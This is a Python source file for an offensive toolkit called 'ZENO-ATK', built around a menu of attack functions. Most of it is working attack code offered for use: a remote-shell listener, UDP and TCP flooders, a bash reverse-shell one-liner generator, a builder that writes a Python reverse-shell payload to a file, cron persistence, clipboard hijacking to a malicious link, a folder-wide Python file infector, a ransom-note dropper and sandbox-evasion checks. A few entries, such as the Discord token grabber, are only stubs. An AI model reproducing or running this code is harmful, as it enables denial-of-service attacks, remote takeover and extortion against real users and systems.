# ZENO-ATK: v11 ULTIMATE PAYLOAD | Ziole x oozvc 🔥

import os, sys, socket, platform, time, threading, subprocess, uuid, hashlib, base64, random
from datetime import datetime

try:
    from pyfiglet import figlet_format
    from colorama import init, Fore
    import pyperclip
except ModuleNotFoundError:
    os.system(f"{sys.executable} -m pip install pyfiglet colorama pyperclip")
    from pyfiglet import figlet_format
    from colorama import init, Fore
    import pyperclip

init(autoreset=True)

# ===================== BANNER =====================
def banner():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
    print(Fore.RED + figlet_format("ZENO-ATK", font="slant"))
    print(Fore.YELLOW + "v11 ULTIMATE PAYLOAD | Terminal Toolkit")
    print(Fore.CYAN + f"Platform: {platform.system()} | Time: {datetime.now().strftime('%H:%M:%S')}")
    print(Fore.MAGENTA + "By Ziole | oozvc Labs\n")

# ===================== CORE FUNCTIONS =====================
def discord_token_grabber():
    print("[!] Token Grabber aktif!")

def start_rat_listener():
    try:
        s = socket.socket()
        s.bind(("0.0.0.0", 4444))
        s.listen(1)
        conn, addr = s.accept()
        print("Connected from", addr)
        while True:
            cmd = input("Shell> ")
            if cmd == "exit": break
            conn.send(cmd.encode())
            print(conn.recv(1024).decode())
    except Exception as e:
        print("[!] RAT error:", e)

def rat_control():
    print("[!] RAT Control ready (implementasi sesuai koneksi klien aktif)")

def udp_flood(ip, port, times):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        for _ in range(times):
            sock.sendto(data, (ip, port))
        print(f"[+] UDP Flood selesai ke {ip}:{port}")
    except Exception as e:
        print("[!] UDP Flood gagal:", e)

def tcp_flood(ip, port, times):
    try:
        for _ in range(times):
            s = socket.socket()
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.close()
        print(f"[+] TCP Flood selesai ke {ip}:{port}")
    except Exception as e:
        print("[!] TCP Flood gagal:", e)

def hash_and_encode():
    msg = input("String: ")
    print("[1] Base64\n[2] MD5\n[3] SHA256")
    opt = input("Choose: ")
    if opt == "1": print(base64.b64encode(msg.encode()).decode())
    elif opt == "2": print(hashlib.md5(msg.encode()).hexdigest())
    elif opt == "3": print(hashlib.sha256(msg.encode()).hexdigest())
    else: print("[!] Invalid option")

def reverse_shell_payload():
    ip = input("IP: "); port = input("Port: ")
    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

def add_cron():
    cmd = input("Command: ")
    os.system(f'(crontab -l 2>/dev/null; echo "@reboot {cmd}") | crontab -')
    print("[+] Cronjob Added")

def malware_builder():
    ip = input("IP: "); port = input("Port: ")
    fn = input("Filename: ")
    payload = f"import socket,subprocess,os\ns=socket.socket()\ns.connect(('{ip}',{port}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh'])"
    with open(fn, 'w') as f:
        f.write(payload)
    print(f"[+] Malware saved as {fn}")

def android_spreader():
    print("[+] Android Spreader aktif – silakan gunakan ADB & APK injector secara manual untuk deploy")

def crypter_payload():
    print("[+] Crypter aktif (simulasi XOR)")
    data = input("Data to encrypt: ")
    key = 123
    enc = ''.join([chr(ord(c) ^ key) for c in data])
    print("Encrypted:", base64.b64encode(enc.encode()).decode())

def clipboard_hijack():
    pyperclip.copy("https://malicious.com")
    print("[+] Clipboard hijacked!")

def anti_sandbox():
    indicators = ["vbox", "vmware", "virtual", "sandbox"]
    for i in indicators:
        if i in platform.platform().lower():
            print("[!] Sandbox detected: exit")
            sys.exit()
    print("[+] No sandbox detected")

def fake_ransom_message():
    with open("READ_ME.txt", 'w') as f:
        f.write("Your files have been encrypted. Pay 1 BTC to wallet xyz123")
    print("[+] Ransom note dropped")

def screenshot_simulator():
    from PIL import ImageGrab
    ss = ImageGrab.grab()
    ss.save("screenshot.png")
    print("[+] Screenshot saved")

def file_infector():
    path = input("Folder: ")
    for root, _, files in os.walk(path):
        for f in files:
            if f.endswith(".py"):
                try:
                    with open(os.path.join(root, f), 'r+') as file:
                        content = file.read()
                        file.seek(0)
                        file.write("# Infected by ZENO\n" + content)
                except: continue
    print("[+] Infection executed")

def main():
    banner()
    menu = [
        discord_token_grabber,
        start_rat_listener,
        rat_control,
        lambda: udp_flood(input("IP: "), int(input("Port: ")), int(input("Packets: "))),
        lambda: tcp_flood(input("IP: "), int(input("Port: ")), int(input("Conns: "))),
        hash_and_encode,
        reverse_shell_payload,
        add_cron,
        malware_builder,
        clipboard_hijack,
        file_infector,
        fake_ransom_message,
        screenshot_simulator,
        crypter_payload,
        android_spreader,
        anti_sandbox
    ]
    while True:
        banner()
        for i, func in enumerate(menu):
            print(Fore.CYAN + f"[{i+1}] ➤ {func.__name__.replace('_', ' ').title()}")
        print("[0] ➤ Exit\n")
        try:
            choice = int(input(Fore.WHITE + "Select Mode > "))
            if choice == 0: break
            menu[choice-1]()
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
        input(Fore.YELLOW + "\n[Enter] to return...")

if __name__ == '__main__':
    main()
